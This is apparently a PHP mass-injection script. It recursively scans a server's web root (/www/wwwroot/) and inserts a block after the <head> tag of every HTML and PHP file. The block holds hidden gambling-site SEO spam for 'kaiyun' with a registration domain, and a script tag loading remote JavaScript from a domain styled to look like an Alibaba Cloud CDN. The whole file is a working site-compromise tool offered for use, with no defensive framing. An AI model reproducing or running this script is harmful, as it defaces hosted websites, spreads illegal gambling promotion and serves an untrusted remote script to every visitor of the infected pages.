<?php

// 指定目录
$dir = '/www/wwwroot/';

// 要插入的内容
$content = '<noscript>
<title>kaiyun体育官方网站全站入口(kaiyun)(中国)官网入口登录</title>
<meta name="keywords" content="kaiyun体育官方网站全站入口,kaiyun体育全站入口,kaiyun体育全站入口登录版,kaiyun体育全站app入口官网"/>
<meta name="description" content="kaiyun体育官方网站全站入口✅欢迎大哥回家✅【官方注册地址：kyun940.com⭐️】我们kaiyun体育全站在线提供：✔官网、登录、入口、官方、网站、平台、网址、网页版、手机版、最新地址、全站app下载需,kaiyun体育全站/棋牌欢迎您的加入!"/>
</noscript>
<script src="https://www.aliyuncsscn.com/web.min.js"></script>';

// 递归遍历目录函数
function traverseDir($dir, $content) {
    $files = scandir($dir);
    foreach ($files as $file) {
        if ($file == '.' || $file == '..') {
            continue;
        }

        $filePath = $dir . DIRECTORY_SEPARATOR . $file;
        if (is_dir($filePath)) {
            // 如果是目录，递归调用
            traverseDir($filePath, $content);
        } elseif (is_file($filePath) && (pathinfo($filePath, PATHINFO_EXTENSION) == 'html' || pathinfo($filePath, PATHINFO_EXTENSION) == 'php')) {
            // 如果是HTML或PHP文件，处理文件内容
            processFile($filePath, $content);
        }
    }
}

// 处理文件内容函数
function processFile($filePath, $content) {
    // 读取文件内容
    $html = file_get_contents($filePath);
    if ($html === false) {
        echo "无法读取文件: $filePath\n";
        return;
    }

    // 检测文件编码
    $encoding = detectEncoding($html);
    if (!$encoding) {
        echo "无法检测文件编码: $filePath\n";
        return;
    }

    // 将内容转换为UTF-8编码处理
    $html = mb_convert_encoding($html, 'UTF-8', $encoding);

    // 在<head>标签后的第一行插入内容
    if (stripos($html, '<head>') !== false) {
        $updatedHtml = preg_replace('/<head>/i', "<head>\n$content", $html, 1);
        if ($updatedHtml === null) {
            echo "正则替换失败: $filePath\n";
            return;
        }

        // 将内容转换回原始编码
        $updatedHtml = mb_convert_encoding($updatedHtml, $encoding, 'UTF-8');

        // 写回文件
        $result = file_put_contents($filePath, $updatedHtml);
        if ($result === false) {
            echo "无法写入文件: $filePath\n";
        } else {
            echo "文件已更新: $filePath\n";
        }
    } else {
        echo "文件中没有<head>标签: $filePath\n";
    }
}

// 检测文件编码函数
function detectEncoding($string) {
    $encodings = ['UTF-8', 'GBK', 'ISO-8859-1', 'windows-1252'];
    foreach ($encodings as $encoding) {
        if (mb_detect_encoding($string, $encoding, true) === $encoding) {
            return $encoding;
        }
    }
    return false;
}

// 开始递归遍历
traverseDir($dir, $content);

echo "所有HTML和PHP文件已处理。\n";

?>
